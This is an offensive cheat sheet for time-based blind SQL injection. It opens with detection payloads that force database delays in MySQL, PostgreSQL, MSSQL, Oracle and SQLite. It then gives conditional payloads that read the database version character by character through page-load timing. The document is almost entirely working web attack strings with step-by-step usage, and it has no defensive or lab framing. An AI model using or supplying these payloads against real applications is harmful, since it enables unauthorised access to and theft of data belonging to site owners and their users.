# 4 - Time-Based Blind SQLi Cheat Sheet

**Overview:** Time-Based SQLi is the ultimate fallback. The webpage does not show errors, nor does it visually change when you inject True/False statements. The only way to confirm execution is to force the database to pause (sleep) before it loads the webpage.

---

## Step 1: The Stopwatch Detection Test
Inject these payloads to see if you can force the web server to take exactly 10 seconds longer to load than usual. 

*(Note: Always test at least 10 seconds to ensure you aren't just experiencing standard network lag).*

| Database Engine | Time Delay Payload (10 Seconds) |
| :--- | :--- |
| **MySQL / MariaDB** | `' AND SLEEP(10)--+` |
| **PostgreSQL** | `' AND 1=(SELECT 1 FROM pg_sleep(10))--` <br>*(Or stacked: `'; SELECT pg_sleep(10)--`)* |
| **Microsoft SQL Server** | `'; WAITFOR DELAY '0:0:10'--` |
| **Oracle** | `' AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',10) FROM DUAL)--` |
| **SQLite** | `' AND 1=(SELECT randomblob(1000000000))--` <br>*(SQLite lacks a sleep command, so we force heavy math).* |

---

## Step 2: Conditional Data Extraction
Once you confirm the database can sleep, you combine it with the Boolean extraction logic. 

**The Logic Formula:**
`' AND IF (The first letter is 'a') THEN (Sleep 10 seconds) ELSE (Do nothing)--`
* *If the page takes 10 seconds to load, your guess was correct.*
* *If the page loads instantly, your guess was wrong. Move to the next letter.*

---

## Step 3: Database-Specific Conditional Payloads
Here is how to extract the first character of the database version using time delays. 

### MySQL
sql
' AND IF(ASCII(SUBSTRING(version(), 1, 1))=97, SLEEP(10), 0)--+

### 🐘 PostgreSQL (Using CASE WHEN)

PostgreSQL requires a CASE statement to handle conditional logic inline.

SQL

`' AND (SELECT CASE WHEN (ASCII(SUBSTRING(version(), 1, 1))=97) THEN pg_sleep(10) ELSE pg_sleep(0) END)--`

### Microsoft SQL Server (MSSQL)

MSSQL easily supports stacked queries (using ;), allowing for clean IF statements.

SQL

`'; IF (ASCII(SUBSTRING(@@version, 1, 1)) = 97) WAITFOR DELAY '0:0:10'--`

### Oracle

Oracle requires heavy syntax to execute a sleep command conditionally within a SELECT statement.

SQL

`' AND 1=(SELECT CASE WHEN (ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1), 1, 1))=97) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',10) ELSE 0 END FROM DUAL)--`
